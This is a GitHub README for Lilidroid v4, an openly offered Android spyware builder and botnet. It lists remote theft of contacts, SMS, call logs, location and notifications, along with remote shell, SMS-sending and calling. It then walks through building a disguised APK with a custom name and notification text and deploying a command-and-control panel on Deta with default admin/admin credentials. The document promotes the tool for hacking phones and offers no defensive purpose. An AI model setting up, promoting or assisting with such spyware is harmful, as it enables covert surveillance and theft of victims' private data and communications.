# Lilidroid v4
![Screenshot](https://raw.githubusercontent.com/Voytho/Lilidroid/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)

It's easy to use android botnet work without port forwarding, vps and android studio


### Features
- Retrive Contact
- Retrive SMS
- Retrive Services
- Retrive Device Location (Only work when the app is open on newer devices)
- Retrive Call Logs
- Run Shell Command
- Change Wallpaper
- Send SMS
- Make Call
- Get Installed Apps
- Download File
- Read Notification
- Auto-Start (May not work on a couple of devices)

### Requirement

- Python3
- Java
- Linux os

### Java version i used
```bash
$ java -version
openjdk version "11.0.13" 2021-10-19
OpenJDK Runtime Environment (build 11.0.13+8)
OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
```

### How to setup
- Set up an account at [deta.sh](https://web.deta.sh/) its free.
- Click Deploy to Deta Button to configure your control panel.
- Clone Lilidroid-phprat repo with the following command.
```bash 
$ git clone https://github.com/Voytho/Lilidroid
```
- cd in the Lilidroid-phprat directory, then type the command below to install all dependencies
```bash
$ pip install -r requirements.txt
```
- Run the following command to see the options that we can use with the builder.
```bash
$ python Lilidroid.py    



██╗░░░░░██╗██╗░░░░░██╗██████╗░██████╗░░█████╗░██╗██████╗░  ██╗░░░██╗░░██╗██╗
██║░░░░░██║██║░░░░░██║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗  ██║░░░██║░██╔╝██║
██║░░░░░██║██║░░░░░██║██║░░██║██████╔╝██║░░██║██║██║░░██║  ╚██╗░██╔╝██╔╝░██║
██║░░░░░██║██║░░░░░██║██║░░██║██╔══██╗██║░░██║██║██║░░██║  ░╚████╔╝░███████║
███████╗██║███████╗██║██████╔╝██║░░██║╚█████╔╝██║██████╔╝  ░░╚██╔╝░░╚════██║
╚══════╝╚═╝╚══════╝╚═╝╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝╚═════╝░  ░░░╚═╝░░░░░░░░╚═╝                                                                                                     


usage: Lilidroid.py [-h] [-v] [-b]

Lilidroid v4.0 - A tool to build lilidroid spyware for Android devices.

options:
  -h, --help     show this help message and exit
  -v, --version  Version of Lilidroid
  -b , --build   Build Lilidroid with custom name [ex: Lilidroid.py -b lilidroid]
```
- To create an apk execute the following command.
```bash
$ python Lilidroid.py -b your_app_name
```
- It will prompt you with your Control Panel url enter your deta micro URL.
- You will also be prompted for the title and text of the notification. Enter what you want to display on the notification.
- DONE

[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/Voytho/Lilidroid_api)

### Manually deploy the Lilidroid control panel
- Set up an account at [deta.sh](https://web.deta.sh/)
- Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
- Logging in to Deta via the CLI
- Create a new Python Micro
- Clone [Lilidroidv4_api](https://github.com/Voytho/Lilidroid_api) repo
- Move all Lilidroidv4_api Files to your deta micro folder.
- Deploy the Control panel using the following command.
```bash
$ deta deploy
```
### Dashboard
- visit : https://{your server url}/v4/overview
- defualt username/password is : admin/admin

### Demo Video
- Youtube : [how to hack android phone using Lilidroid v4](https://www.youtube.com/)

### Support me
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/felusiekf)

### Contact info 
- Email : felusiek@gmail.com
- Discord : https://discord.gg/
